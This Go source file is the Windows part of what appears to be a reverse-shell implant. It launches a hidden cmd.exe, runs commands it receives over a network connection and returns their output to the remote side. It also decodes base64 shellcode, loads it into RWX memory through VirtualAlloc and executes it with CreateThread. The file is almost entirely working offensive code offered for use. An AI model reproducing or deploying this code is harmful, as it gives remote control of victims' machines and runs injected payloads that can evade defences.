// +build windows !linux !darwin !freebsd

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
func GetShell() *exec.Cmd {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// ExecuteCmd runs the provided command through cmd.exe
// and redirects the result to the provided net.Conn object.
func ExecuteCmd(command string, conn net.Conn) {
	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
// and executes it via a syscall.Syscall call.
func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}
